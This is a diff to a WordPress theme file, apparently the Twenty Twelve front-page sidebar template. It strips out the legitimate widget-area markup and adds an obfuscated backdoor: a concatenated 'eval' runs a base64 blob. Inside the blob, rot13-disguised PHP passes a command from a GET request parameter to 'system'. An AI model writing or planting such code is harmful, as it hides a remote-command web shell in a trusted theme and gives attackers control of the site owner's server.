@@ -1,46 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * The sidebar containing the front page widget areas
- *
- * If no active widgets are in either sidebar, hide them completely.
- *
- * @package WordPress
- * @subpackage Twenty_Twelve
- * @since Twenty Twelve 1.0
- */
-
-/*
- * The front page widget area is triggered if any of the areas
- * have widgets. So let's check that first.
- *
- * If none of the sidebars have widgets, then let's bail early.
- */
-if ( ! is_active_sidebar( 'sidebar-2' ) && ! is_active_sidebar( 'sidebar-3' ) ) {
-	return;
-}
-
-// If we get this far, we have widgets. Let do this.
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3VyIGZ2cXJvbmUgcGJhZ252YXZhdCBndXIgc2ViYWcgY250ciBqdnF0cmcgbmVybmYKICoKICogVnMgYWIgbnBndmlyIGp2cXRyZ2YgbmVyIHZhIHJ2Z3VyZSBmdnFyb25lLCB1dnFyIGd1cnogcGJ6Y3lyZ3J5bC4KICoKICogQGNucHhudHIgSmJlcUNlcmZmCiAqIEBmaG9jbnB4bnRyIEdqcmFnbF9HanJ5aXIKICogQGZ2YXByIEdqcmFnbCBHanJ5aXIgMS4wCiAqLwoKLyoKICogR3VyIHNlYmFnIGNudHIganZxdHJnIG5lcm4gdmYgZ2V2dHRyZXJxIHZzIG5hbCBicyBndXIgbmVybmYKICogdW5pciBqdnF0cmdmLiBGYiB5cmcnZiBwdXJweCBndW5nIHN2ZWZnLgogKgogKiBWcyBhYmFyIGJzIGd1ciBmdnFyb25lZiB1bmlyIGp2cXRyZ2YsIGd1cmEgeXJnJ2Ygb252eSBybmV5bC4KICovCnZzICggISB2Zl9ucGd2aXJfZnZxcm9uZSggJ2Z2cXJvbmUtMicgKSAmJiAhIHZmX25wZ3Zpcl9mdnFyb25lKCAnZnZxcm9uZS0zJyApICkgewoJZXJnaGVhOwp9CgovLyBWcyBqciB0cmcgZ3V2ZiBzbmUsIGpyIHVuaXIganZxdHJnZi4gWXJnIHFiIGd1dmYuCj8+CjxxdmkgdnE9XCJmcnBiYXFuZWxcIiBweW5mZj1cImp2cXRyZy1uZXJuXCIgZWJ5cj1cInBiemN5cnpyYWduZWxcIj4KCTw/Y3VjIHZzICggdmZfbnBndmlyX2Z2cXJvbmUoICdmdnFyb25lLTInICkgKSA6ID8+Cgk8cXZpIHB5bmZmPVwic3ZlZmcgc2ViYWctanZxdHJnZlwiPgoJCTw/Y3VjIHFsYW56dnBfZnZxcm9uZSggJ2Z2cXJvbmUtMicgKTsgPz4KCTwvcXZpPjwhLS0gLnN2ZWZnIC0tPgoJPD9jdWMgcmFxdnM7ID8+CgoJPD9jdWMgdnMgKCB2Zl9ucGd2aXJfZnZxcm9uZSggJ2Z2cXJvbmUtMycgKSApIDogPz4KCTxxdmkgcHluZmY9XCJmcnBiYXEgc2ViYWctanZxdHJnZlwiPgoJCTw/Y3VjIHFsYW56dnBfZnZxcm9uZSggJ2Z2cXJvbmUtMycgKTsgPz4KCTwvcXZpPjwhLS0gLmZycGJhcSAtLT4KCTw/Y3VjIHJhcXZzOyA/Pgo8L3F2aT48IS0tICNmcnBiYXFuZWwgLS0+CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
 ?>
-<div id="secondary" class="widget-area" role="complementary">
-	<?php if ( is_active_sidebar( 'sidebar-2' ) ) : ?>
-	<div class="first front-widgets">
-		<?php dynamic_sidebar( 'sidebar-2' ); ?>
-	</div><!-- .first -->
-	<?php endif; ?>
-
-	<?php if ( is_active_sidebar( 'sidebar-3' ) ) : ?>
-	<div class="second front-widgets">
-		<?php dynamic_sidebar( 'sidebar-3' ); ?>
-	</div><!-- .second -->
-	<?php endif; ?>
-</div><!-- #secondary -->
